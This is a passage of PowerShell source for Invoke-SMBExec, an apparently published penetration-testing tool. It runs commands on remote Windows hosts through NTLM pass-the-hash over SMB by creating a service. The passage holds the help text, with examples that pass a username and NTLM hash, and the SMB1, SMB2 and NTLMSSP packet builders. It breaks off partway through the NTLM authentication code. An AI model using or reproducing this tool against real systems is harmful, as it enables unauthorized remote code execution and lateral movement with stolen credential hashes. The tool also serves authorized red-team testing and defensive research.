function Invoke-SMBExec
{
<#
.SYNOPSIS
Invoke-SMBExec performs SMBExec style command execution with NTLMv2 pass the hash authentication. Invoke-SMBExec
supports SMB1 and SMB2 with and without SMB signing.

Author: Kevin Robertson (@kevin_robertson)
License: BSD 3-Clause

.PARAMETER Target
Hostname or IP address of target.

.PARAMETER Username
Username to use for authentication.

.PARAMETER Domain
Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the
username. 

.PARAMETER Hash
NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.

.PARAMETER Command
Command to execute on the target. If a command is not specified, the function will check to see if the username
and hash provides local administrator access on the target.

.PARAMETER CommandCOMSPEC
Default = Enabled: Prepend %COMSPEC% /C to Command.

.PARAMETER Service
Default = 20 Character Random: Name of the service to create and delete on the target.

.PARAMETER SMB1
(Switch) Force SMB1. The default behavior is to perform SMB version negotiation and use SMB2 if supported by the
target.

.PARAMETER Sleep
Default = 150 Milliseconds: Sets the function's Start-Sleep values in milliseconds. You can try tweaking this
setting if you are experiencing strange results.

.PARAMETER Session
Inveigh-Relay authenticated session.

.PARAMETER SigningCheck
(Switch) Checks to see if SMB signing is required on a target.

.EXAMPLE
Execute a command.
Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose

.EXAMPLE
Check command execution privilege.
Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0

.EXAMPLE
Execute a command using an authenticated Inveigh-Relay session.
Invoke-SMBExec -Session 1 -Command "command or launcher to execute"

.EXAMPLE
Check if SMB signing is required.
Invoke-SMBExec -Target 192.168.100.20 -SigningCheck

.LINK
https://github.com/Kevin-Robertson/Invoke-TheHash

#>
[CmdletBinding(DefaultParametersetName='Default')]
param
(
    [parameter(ParameterSetName='Default',Mandatory=$true)][String]$Target,
    [parameter(ParameterSetName='Default',Mandatory=$true)][String]$Username,
    [parameter(ParameterSetName='Default',Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$false)][String]$Command,
    [parameter(ParameterSetName='Default',Mandatory=$false)][ValidateSet("Y","N")][String]$CommandCOMSPEC="Y",
    [parameter(ParameterSetName='Default',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][String]$Service,
    [parameter(ParameterSetName='Default',Mandatory=$true)][Switch]$SigningCheck,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Int]$Session,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Logoff,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Refresh,
    [parameter(ParameterSetName='Default',Mandatory=$false)][Switch]$SMB1,
    [parameter(Mandatory=$false)][Int]$Sleep=150
)

if($Command)
{
    $SMB_execute = $true
}

if($SMB1)
{
    $SMB_version = 'SMB1'
}

function ConvertFrom-PacketOrderedDictionary
{
    param($packet_ordered_dictionary)

    ForEach($field in $packet_ordered_dictionary.Values)
    {
        $byte_array += $field
    }

    return $byte_array
}

#NetBIOS

function New-PacketNetBIOSSessionService
{
    param([Int]$packet_header_length,[Int]$packet_data_length)

    [Byte[]]$packet_netbios_session_service_length = [System.BitConverter]::GetBytes($packet_header_length + $packet_data_length)
    $packet_NetBIOS_session_service_length = $packet_netbios_session_service_length[2..0]

    $packet_NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_NetBIOSSessionService.Add("Message_Type",[Byte[]](0x00))
    $packet_NetBIOSSessionService.Add("Length",[Byte[]]($packet_netbios_session_service_length))

    return $packet_NetBIOSSessionService
}

#SMB1

function New-PacketSMBHeader
{
    param([Byte[]]$packet_command,[Byte[]]$packet_flags,[Byte[]]$packet_flags2,[Byte[]]$packet_tree_ID,[Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID)

    $packet_SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBHeader.Add("Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
    $packet_SMBHeader.Add("Command",$packet_command)
    $packet_SMBHeader.Add("ErrorClass",[Byte[]](0x00))
    $packet_SMBHeader.Add("Reserved",[Byte[]](0x00))
    $packet_SMBHeader.Add("ErrorCode",[Byte[]](0x00,0x00))
    $packet_SMBHeader.Add("Flags",$packet_flags)
    $packet_SMBHeader.Add("Flags2",$packet_flags2)
    $packet_SMBHeader.Add("ProcessIDHigh",[Byte[]](0x00,0x00))
    $packet_SMBHeader.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMBHeader.Add("Reserved2",[Byte[]](0x00,0x00))
    $packet_SMBHeader.Add("TreeID",$packet_tree_ID)
    $packet_SMBHeader.Add("ProcessID",$packet_process_ID)
    $packet_SMBHeader.Add("UserID",$packet_user_ID)
    $packet_SMBHeader.Add("MultiplexID",[Byte[]](0x00,0x00))

    return $packet_SMBHeader
}

function New-PacketSMBNegotiateProtocolRequest
{
    param([String]$packet_version)

    if($packet_version -eq 'SMB1')
    {
        [Byte[]]$packet_byte_count = 0x0c,0x00
    }
    else
    {
        [Byte[]]$packet_byte_count = 0x22,0x00  
    }

    $packet_SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBNegotiateProtocolRequest.Add("WordCount",[Byte[]](0x00))
    $packet_SMBNegotiateProtocolRequest.Add("ByteCount",$packet_byte_count)
    $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))
    $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

    if($packet_version -ne 'SMB1')
    {
        $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))
        $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
        $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))
        $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
    }

    return $packet_SMBNegotiateProtocolRequest
}

function New-PacketSMBSessionSetupAndXRequest
{
    param([Byte[]]$packet_security_blob)

    [Byte[]]$packet_byte_count = [System.BitConverter]::GetBytes($packet_security_blob.Length)
    $packet_byte_count = $packet_byte_count[0,1]
    [Byte[]]$packet_security_blob_length = [System.BitConverter]::GetBytes($packet_security_blob.Length + 5)
    $packet_security_blob_length = $packet_security_blob_length[0,1]

    $packet_SMBSessionSetupAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBSessionSetupAndXRequest.Add("WordCount",[Byte[]](0x0c))
    $packet_SMBSessionSetupAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $packet_SMBSessionSetupAndXRequest.Add("Reserved",[Byte[]](0x00))
    $packet_SMBSessionSetupAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $packet_SMBSessionSetupAndXRequest.Add("MaxBuffer",[Byte[]](0xff,0xff))
    $packet_SMBSessionSetupAndXRequest.Add("MaxMpxCount",[Byte[]](0x02,0x00))
    $packet_SMBSessionSetupAndXRequest.Add("VCNumber",[Byte[]](0x01,0x00))
    $packet_SMBSessionSetupAndXRequest.Add("SessionKey",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMBSessionSetupAndXRequest.Add("SecurityBlobLength",$packet_byte_count)
    $packet_SMBSessionSetupAndXRequest.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMBSessionSetupAndXRequest.Add("Capabilities",[Byte[]](0x44,0x00,0x00,0x80))
    $packet_SMBSessionSetupAndXRequest.Add("ByteCount",$packet_security_blob_length)
    $packet_SMBSessionSetupAndXRequest.Add("SecurityBlob",$packet_security_blob)
    $packet_SMBSessionSetupAndXRequest.Add("NativeOS",[Byte[]](0x00,0x00,0x00))
    $packet_SMBSessionSetupAndXRequest.Add("NativeLANManage",[Byte[]](0x00,0x00))

    return $packet_SMBSessionSetupAndXRequest 
}

function New-PacketSMBTreeConnectAndXRequest
{
    param([Byte[]]$packet_path)

    [Byte[]]$packet_path_length = [System.BitConverter]::GetBytes($packet_path.Length + 7)
    $packet_path_length = $packet_path_length[0,1]

    $packet_SMBTreeConnectAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBTreeConnectAndXRequest.Add("WordCount",[Byte[]](0x04))
    $packet_SMBTreeConnectAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $packet_SMBTreeConnectAndXRequest.Add("Reserved",[Byte[]](0x00))
    $packet_SMBTreeConnectAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $packet_SMBTreeConnectAndXRequest.Add("Flags",[Byte[]](0x00,0x00))
    $packet_SMBTreeConnectAndXRequest.Add("PasswordLength",[Byte[]](0x01,0x00))
    $packet_SMBTreeConnectAndXRequest.Add("ByteCount",$packet_path_length)
    $packet_SMBTreeConnectAndXRequest.Add("Password",[Byte[]](0x00))
    $packet_SMBTreeConnectAndXRequest.Add("Tree",$packet_path)
    $packet_SMBTreeConnectAndXRequest.Add("Service",[Byte[]](0x3f,0x3f,0x3f,0x3f,0x3f,0x00))

    return $packet_SMBTreeConnectAndXRequest
}

function New-PacketSMBNTCreateAndXRequest
{
    param([Byte[]]$packet_named_pipe)

    [Byte[]]$packet_named_pipe_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length)
    $packet_named_pipe_length = $packet_named_pipe_length[0,1]
    [Byte[]]$packet_file_name_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length - 1)
    $packet_file_name_length = $packet_file_name_length[0,1]

    $packet_SMBNTCreateAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBNTCreateAndXRequest.Add("WordCount",[Byte[]](0x18))
    $packet_SMBNTCreateAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $packet_SMBNTCreateAndXRequest.Add("Reserved",[Byte[]](0x00))
    $packet_SMBNTCreateAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $packet_SMBNTCreateAndXRequest.Add("Reserved2",[Byte[]](0x00))
    $packet_SMBNTCreateAndXRequest.Add("FileNameLen",$packet_file_name_length)
    $packet_SMBNTCreateAndXRequest.Add("CreateFlags",[Byte[]](0x16,0x00,0x00,0x00))
    $packet_SMBNTCreateAndXRequest.Add("RootFID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMBNTCreateAndXRequest.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
    $packet_SMBNTCreateAndXRequest.Add("AllocationSize",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMBNTCreateAndXRequest.Add("FileAttributes",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMBNTCreateAndXRequest.Add("ShareAccess",[Byte[]](0x07,0x00,0x00,0x00))
    $packet_SMBNTCreateAndXRequest.Add("Disposition",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SMBNTCreateAndXRequest.Add("CreateOptions",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMBNTCreateAndXRequest.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_SMBNTCreateAndXRequest.Add("SecurityFlags",[Byte[]](0x00))
    $packet_SMBNTCreateAndXRequest.Add("ByteCount",$packet_named_pipe_length)
    $packet_SMBNTCreateAndXRequest.Add("Filename",$packet_named_pipe)

    return $packet_SMBNTCreateAndXRequest
}

function New-PacketSMBReadAndXRequest
{
    $packet_SMBReadAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBReadAndXRequest.Add("WordCount",[Byte[]](0x0a))
    $packet_SMBReadAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $packet_SMBReadAndXRequest.Add("Reserved",[Byte[]](0x00))
    $packet_SMBReadAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $packet_SMBReadAndXRequest.Add("FID",[Byte[]](0x00,0x40))
    $packet_SMBReadAndXRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMBReadAndXRequest.Add("MaxCountLow",[Byte[]](0x58,0x02))
    $packet_SMBReadAndXRequest.Add("MinCount",[Byte[]](0x58,0x02))
    $packet_SMBReadAndXRequest.Add("Unknown",[Byte[]](0xff,0xff,0xff,0xff))
    $packet_SMBReadAndXRequest.Add("Remaining",[Byte[]](0x00,0x00))
    $packet_SMBReadAndXRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $packet_SMBReadAndXRequest
}

function New-PacketSMBWriteAndXRequest
{
    param([Byte[]]$packet_file_ID,[Int]$packet_RPC_length)

    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_RPC_length)
    $packet_write_length = $packet_write_length[0,1]

    $packet_SMBWriteAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBWriteAndXRequest.Add("WordCount",[Byte[]](0x0e))
    $packet_SMBWriteAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $packet_SMBWriteAndXRequest.Add("Reserved",[Byte[]](0x00))
    $packet_SMBWriteAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $packet_SMBWriteAndXRequest.Add("FID",$packet_file_ID)
    $packet_SMBWriteAndXRequest.Add("Offset",[Byte[]](0xea,0x03,0x00,0x00))
    $packet_SMBWriteAndXRequest.Add("Reserved2",[Byte[]](0xff,0xff,0xff,0xff))
    $packet_SMBWriteAndXRequest.Add("WriteMode",[Byte[]](0x08,0x00))
    $packet_SMBWriteAndXRequest.Add("Remaining",$packet_write_length)
    $packet_SMBWriteAndXRequest.Add("DataLengthHigh",[Byte[]](0x00,0x00))
    $packet_SMBWriteAndXRequest.Add("DataLengthLow",$packet_write_length)
    $packet_SMBWriteAndXRequest.Add("DataOffset",[Byte[]](0x3f,0x00))
    $packet_SMBWriteAndXRequest.Add("HighOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMBWriteAndXRequest.Add("ByteCount",$packet_write_length)

    return $packet_SMBWriteAndXRequest
}

function New-PacketSMBCloseRequest
{
    param ([Byte[]]$packet_file_ID)

    $packet_SMBCloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBCloseRequest.Add("WordCount",[Byte[]](0x03))
    $packet_SMBCloseRequest.Add("FID",$packet_file_ID)
    $packet_SMBCloseRequest.Add("LastWrite",[Byte[]](0xff,0xff,0xff,0xff))
    $packet_SMBCloseRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $packet_SMBCloseRequest
}

function New-PacketSMBTreeDisconnectRequest
{
    $packet_SMBTreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBTreeDisconnectRequest.Add("WordCount",[Byte[]](0x00))
    $packet_SMBTreeDisconnectRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $packet_SMBTreeDisconnectRequest
}

function New-PacketSMBLogoffAndXRequest
{
    $packet_SMBLogoffAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBLogoffAndXRequest.Add("WordCount",[Byte[]](0x02))
    $packet_SMBLogoffAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $packet_SMBLogoffAndXRequest.Add("Reserved",[Byte[]](0x00))
    $packet_SMBLogoffAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $packet_SMBLogoffAndXRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $packet_SMBLogoffAndXRequest
}

#SMB2

function New-PacketSMB2Header
{
    param([Byte[]]$packet_command,[Int]$packet_message_ID,[Byte[]]$packet_tree_ID,[Byte[]]$packet_session_ID)

    [Byte[]]$packet_message_ID = [System.BitConverter]::GetBytes($packet_message_ID) + 0x00,0x00,0x00,0x00

    $packet_SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2Header.Add("ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
    $packet_SMB2Header.Add("StructureSize",[Byte[]](0x40,0x00))
    $packet_SMB2Header.Add("CreditCharge",[Byte[]](0x01,0x00))
    $packet_SMB2Header.Add("ChannelSequence",[Byte[]](0x00,0x00))
    $packet_SMB2Header.Add("Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2Header.Add("Command",$packet_command)
    $packet_SMB2Header.Add("CreditRequest",[Byte[]](0x00,0x00))
    $packet_SMB2Header.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2Header.Add("NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2Header.Add("MessageID",$packet_message_ID)
    $packet_SMB2Header.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2Header.Add("TreeID",$packet_tree_ID)
    $packet_SMB2Header.Add("SessionID",$packet_session_ID)
    $packet_SMB2Header.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $packet_SMB2Header
}

function New-PacketSMB2NegotiateProtocolRequest
{
    $packet_SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2NegotiateProtocolRequest.Add("StructureSize",[Byte[]](0x24,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("DialectCount",[Byte[]](0x02,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("SecurityMode",[Byte[]](0x01,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("Capabilities",[Byte[]](0x40,0x00,0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("NegotiateContextCount",[Byte[]](0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("Reserved2",[Byte[]](0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("Dialect",[Byte[]](0x02,0x02))
    $packet_SMB2NegotiateProtocolRequest.Add("Dialect2",[Byte[]](0x10,0x02))

    return $packet_SMB2NegotiateProtocolRequest
}

function New-PacketSMB2SessionSetupRequest
{
    param([Byte[]]$packet_security_blob)

    [Byte[]]$packet_security_blob_length = [System.BitConverter]::GetBytes($packet_security_blob.Length)
    $packet_security_blob_length = $packet_security_blob_length[0,1]

    $packet_SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2SessionSetupRequest.Add("StructureSize",[Byte[]](0x19,0x00))
    $packet_SMB2SessionSetupRequest.Add("Flags",[Byte[]](0x00))
    $packet_SMB2SessionSetupRequest.Add("SecurityMode",[Byte[]](0x01))
    $packet_SMB2SessionSetupRequest.Add("Capabilities",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2SessionSetupRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2SessionSetupRequest.Add("SecurityBufferOffset",[Byte[]](0x58,0x00))
    $packet_SMB2SessionSetupRequest.Add("SecurityBufferLength",$packet_security_blob_length)
    $packet_SMB2SessionSetupRequest.Add("PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2SessionSetupRequest.Add("Buffer",$packet_security_blob)

    return $packet_SMB2SessionSetupRequest 
}

function New-PacketSMB2TreeConnectRequest
{
    param([Byte[]]$packet_path)

    [Byte[]]$packet_path_length = [System.BitConverter]::GetBytes($packet_path.Length)
    $packet_path_length = $packet_path_length[0,1]

    $packet_SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2TreeConnectRequest.Add("StructureSize",[Byte[]](0x09,0x00))
    $packet_SMB2TreeConnectRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2TreeConnectRequest.Add("PathOffset",[Byte[]](0x48,0x00))
    $packet_SMB2TreeConnectRequest.Add("PathLength",$packet_path_length)
    $packet_SMB2TreeConnectRequest.Add("Buffer",$packet_path)

    return $packet_SMB2TreeConnectRequest
}

function New-PacketSMB2CreateRequestFile
{
    param([Byte[]]$packet_named_pipe)

    $packet_named_pipe_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length)
    $packet_named_pipe_length = $packet_named_pipe_length[0,1]

    $packet_SMB2CreateRequestFile = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2CreateRequestFile.Add("StructureSize",[Byte[]](0x39,0x00))
    $packet_SMB2CreateRequestFile.Add("Flags",[Byte[]](0x00))
    $packet_SMB2CreateRequestFile.Add("RequestedOplockLevel",[Byte[]](0x00))
    $packet_SMB2CreateRequestFile.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add("SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add("DesiredAccess",[Byte[]](0x03,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add("FileAttributes",[Byte[]](0x80,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add("ShareAccess",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add("CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add("CreateOptions",[Byte[]](0x40,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add("NameOffset",[Byte[]](0x78,0x00))
    $packet_SMB2CreateRequestFile.Add("NameLength",$packet_named_pipe_length)
    $packet_SMB2CreateRequestFile.Add("CreateContextsOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add("CreateContextsLength",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add("Buffer",$packet_named_pipe)

    return $packet_SMB2CreateRequestFile
}

function New-PacketSMB2ReadRequest
{
    param ([Byte[]]$packet_file_ID)

    $packet_SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2ReadRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $packet_SMB2ReadRequest.Add("Padding",[Byte[]](0x50))
    $packet_SMB2ReadRequest.Add("Flags",[Byte[]](0x00))
    $packet_SMB2ReadRequest.Add("Length",[Byte[]](0x00,0x00,0x10,0x00))
    $packet_SMB2ReadRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2ReadRequest.Add("FileID",$packet_file_ID)
    $packet_SMB2ReadRequest.Add("MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2ReadRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2ReadRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2ReadRequest.Add("ReadChannelInfoOffset",[Byte[]](0x00,0x00))
    $packet_SMB2ReadRequest.Add("ReadChannelInfoLength",[Byte[]](0x00,0x00))
    $packet_SMB2ReadRequest.Add("Buffer",[Byte[]](0x30))

    return $packet_SMB2ReadRequest
}

function New-PacketSMB2WriteRequest
{
    param([Byte[]]$packet_file_ID,[Int]$packet_RPC_length)

    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_RPC_length)

    $packet_SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2WriteRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $packet_SMB2WriteRequest.Add("DataOffset",[Byte[]](0x70,0x00))
    $packet_SMB2WriteRequest.Add("Length",$packet_write_length)
    $packet_SMB2WriteRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2WriteRequest.Add("FileID",$packet_file_ID)
    $packet_SMB2WriteRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2WriteRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2WriteRequest.Add("WriteChannelInfoOffset",[Byte[]](0x00,0x00))
    $packet_SMB2WriteRequest.Add("WriteChannelInfoLength",[Byte[]](0x00,0x00))
    $packet_SMB2WriteRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))

    return $packet_SMB2WriteRequest
}

function New-PacketSMB2CloseRequest
{
    param ([Byte[]]$packet_file_ID)

    $packet_SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2CloseRequest.Add("StructureSize",[Byte[]](0x18,0x00))
    $packet_SMB2CloseRequest.Add("Flags",[Byte[]](0x00,0x00))
    $packet_SMB2CloseRequest.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2CloseRequest.Add("FileID",$packet_file_ID)

    return $packet_SMB2CloseRequest
}

function New-PacketSMB2TreeDisconnectRequest
{
    $packet_SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2TreeDisconnectRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $packet_SMB2TreeDisconnectRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $packet_SMB2TreeDisconnectRequest
}

function New-PacketSMB2SessionLogoffRequest
{
    $packet_SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2SessionLogoffRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $packet_SMB2SessionLogoffRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $packet_SMB2SessionLogoffRequest
}

#NTLM

function New-PacketNTLMSSPNegotiate
{
    param([Byte[]]$packet_negotiate_flags,[Byte[]]$packet_version)

    [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes(32 + $packet_version.Length)
    $packet_NTLMSSP_length = $packet_NTLMSSP_length[0]
    [Byte[]]$packet_ASN_length_1 = $packet_NTLMSSP_length[0] + 32
    [Byte[]]$packet_ASN_length_2 = $packet_NTLMSSP_length[0] + 22
    [Byte[]]$packet_ASN_length_3 = $packet_NTLMSSP_length[0] + 20
    [Byte[]]$packet_ASN_length_4 = $packet_NTLMSSP_length[0] + 2

    $packet_NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_NTLMSSPNegotiate.Add("InitialContextTokenID",[Byte[]](0x60))
    $packet_NTLMSSPNegotiate.Add("InitialcontextTokenLength",$packet_ASN_length_1)
    $packet_NTLMSSPNegotiate.Add("ThisMechID",[Byte[]](0x06))
    $packet_NTLMSSPNegotiate.Add("ThisMechLength",[Byte[]](0x06))
    $packet_NTLMSSPNegotiate.Add("OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
    $packet_NTLMSSPNegotiate.Add("InnerContextTokenID",[Byte[]](0xa0))
    $packet_NTLMSSPNegotiate.Add("InnerContextTokenLength",$packet_ASN_length_2)
    $packet_NTLMSSPNegotiate.Add("InnerContextTokenID2",[Byte[]](0x30))
    $packet_NTLMSSPNegotiate.Add("InnerContextTokenLength2",$packet_ASN_length_3)
    $packet_NTLMSSPNegotiate.Add("MechTypesID",[Byte[]](0xa0))
    $packet_NTLMSSPNegotiate.Add("MechTypesLength",[Byte[]](0x0e))
    $packet_NTLMSSPNegotiate.Add("MechTypesID2",[Byte[]](0x30))
    $packet_NTLMSSPNegotiate.Add("MechTypesLength2",[Byte[]](0x0c))
    $packet_NTLMSSPNegotiate.Add("MechTypesID3",[Byte[]](0x06))
    $packet_NTLMSSPNegotiate.Add("MechTypesLength3",[Byte[]](0x0a))
    $packet_NTLMSSPNegotiate.Add("MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
    $packet_NTLMSSPNegotiate.Add("MechTokenID",[Byte[]](0xa2))
    $packet_NTLMSSPNegotiate.Add("MechTokenLength",$packet_ASN_length_4)
    $packet_NTLMSSPNegotiate.Add("NTLMSSPID",[Byte[]](0x04))
    $packet_NTLMSSPNegotiate.Add("NTLMSSPLength",$packet_NTLMSSP_length)
    $packet_NTLMSSPNegotiate.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
    $packet_NTLMSSPNegotiate.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_NTLMSSPNegotiate.Add("NegotiateFlags",$packet_negotiate_flags)
    $packet_NTLMSSPNegotiate.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_NTLMSSPNegotiate.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    if($packet_version)
    {
        $packet_NTLMSSPNegotiate.Add("Version",$packet_version)
    }

    return $packet_NTLMSSPNegotiate
}

function New-PacketNTLMSSPAuth
{
    param([Byte[]]$packet_NTLM_response)

